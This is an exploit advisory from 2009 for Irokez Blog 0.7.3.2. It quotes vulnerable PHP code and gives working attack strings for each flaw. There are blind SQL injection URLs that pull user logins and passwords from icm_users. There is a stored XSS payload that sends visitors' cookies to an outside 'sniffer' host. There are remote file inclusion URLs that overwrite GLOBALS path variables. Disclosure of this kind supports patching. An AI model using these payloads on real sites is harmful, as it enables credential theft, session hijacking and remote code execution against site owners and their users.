Irokez BLog 0.7.3.2 (XSS/RFI/BSQL) Multiple Remote Vulnerabilities
==================================================================


================================================================================
|| Irokez Blog BLIND SQL-INJECTION, INCLUDE, ACTIVE XSS
================================================================================

Application: Irokez Blog
------------
Website: http://irokez.org
--------
Version: All (0.7.3.2)
--------
Date: 11-02-2009
-----

[ BLIND SQL-INJECTION ]

[ SOME VULNERABLE CODE ]

/classes/table.class.php

...
if ($is_trans) {
                $query = "select t.*, m.* from {$this->_name} m"
                       . " left join {$this->_name}{$this->_trans} t on (t.{$this->_item} = m.id)"
                       . " where m.id = &#039;$id&#039; group by {$this->_lang}";
        	} else {
                $query = "select * from {$this->_name} where id = &#039;$id&#039;";
        	}
            $result = $this->db->exeQuery($query);

===>>> Exploit:

http://irokez/blog/life/15&#039; and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1)) between 100 and &#039;115
http://irokez/blog/life/15&#039; and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1))=&#039;114
etc

[ ACTIVE XSS ]

in comments.

[ SOME VULNERABLE CODE ]

/scripts/blog/output-post.inc.php

 <input id="name" type="text" class="text" name="name" value="<?php echo $name?>" />
                <label for="name"><?php echo $GLOBALS[&#039;LANG&#039;][&#039;blog&#039;][&#039;name&#039;]?></label>
            </li>
            <li>
                <input id="email" type="text" class="text" name="email" value="<?php echo $email?>" />
                <label for="email"><?php echo $GLOBALS[&#039;LANG&#039;][&#039;blog&#039;][&#039;email&#039;]?></label>
            </li>
            <li>
                <input id="site" type="text" class="text" name="site" value="<?php echo $site?>" />
                <label for="site"><?php echo $GLOBALS[&#039;LANG&#039;][&#039;blog&#039;][&#039;site&#039;]?></label>
...
 <textarea id="message" name="message" class="textarea"><?php echo $message?></xtextarea>

===>>> Exploit:

<script>img = new Image(); img.src = "http://sniffer/sniff.jpg?"+document.cookie;</script>

[ INCLUDE ]

[ SOME VULNERABLE CODE ]

/thumbnail.php
...
ob_start();
switch ($module) {
    case &#039;gallery&#039;:
        include_once $GLOBALS[&#039;PTH&#039;][&#039;classes&#039;] . &#039;gallery.class.php&#039;;
        $Obj = new TBL_Gallery;
        $image_path = $GLOBALS[&#039;PTH&#039;][&#039;gallery&#039;] . getVar($Obj->select($id), &#039;src&#039;);
        break;
    default:
        $image_path = &#039;&#039;;
}

===>>> Exploit:

http://irokez/modules/tml/block.tag.php?GLOBALS[PTH][classes]=[include]
http://irokez/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=[include]
http://irokez/thumbnail.php?module=gallery&GLOBALS[PTH][classes]=[include]
http://irokez/spaw/spaw_control.class.php?GLOBALS[spaw_root]=[include]

Author: Eugene "Corwin" Ermakov
-------                    



